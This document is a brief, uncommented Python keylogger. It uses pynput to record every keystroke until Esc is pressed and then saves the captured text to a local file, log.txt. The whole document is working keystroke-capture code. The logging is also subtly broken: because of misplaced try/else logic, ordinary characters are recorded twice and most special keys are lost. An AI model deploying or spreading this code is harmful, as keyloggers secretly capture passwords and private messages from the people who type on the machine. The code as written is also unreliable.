import pynput
log = ""
def on_press(key):
    global log
    try:
        log = log + key.char
    except AttributeError:
        if key == key.space:
            log = log + " "
    else:
        log = log + " " + str(key) + " "
def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
with open("log.txt", "w") as f:
    f.write(log) 
